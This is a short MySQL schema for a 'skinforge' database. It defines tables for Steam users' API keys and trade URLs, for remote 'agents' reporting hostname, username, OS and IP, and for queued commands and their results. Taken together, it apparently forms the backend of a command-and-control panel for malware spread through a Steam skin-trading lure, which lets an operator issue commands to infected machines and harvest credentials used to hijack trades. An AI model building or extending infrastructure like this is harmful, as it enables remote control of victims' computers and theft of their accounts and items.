-- Create the database if it doesn't exist
CREATE DATABASE IF NOT EXISTS skinforge_db;
USE skinforge_db;

-- Create users table
CREATE TABLE IF NOT EXISTS users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    steam_id VARCHAR(255) NOT NULL UNIQUE,
    api_key VARCHAR(255),
    trade_url TEXT,
    app_installed BOOLEAN DEFAULT FALSE,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_login TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    INDEX idx_steam_id (steam_id)
);

-- Create agents table
CREATE TABLE IF NOT EXISTS agents (
    id INT AUTO_INCREMENT PRIMARY KEY,
    agent_id VARCHAR(255) NOT NULL UNIQUE,
    user_id INT,
    hostname VARCHAR(255),
    username VARCHAR(255),
    os_info VARCHAR(255),
    ip_address VARCHAR(255),
    first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- Create commands table
CREATE TABLE IF NOT EXISTS commands (
    id INT AUTO_INCREMENT PRIMARY KEY,
    agent_id INT,
    command_type VARCHAR(50),
    command_data TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    is_executed BOOLEAN DEFAULT FALSE,
    FOREIGN KEY (agent_id) REFERENCES agents(id) ON DELETE CASCADE
);

-- Create command results table
CREATE TABLE IF NOT EXISTS command_results (
    id INT AUTO_INCREMENT PRIMARY KEY,
    command_id INT,
    result_data LONGTEXT,
    success BOOLEAN,
    error_message TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (command_id) REFERENCES commands(id) ON DELETE CASCADE
);

-- Create any additional tables as needed
-- Add more tables here based on your application requirements

-- Show the created table structure
DESCRIBE users; 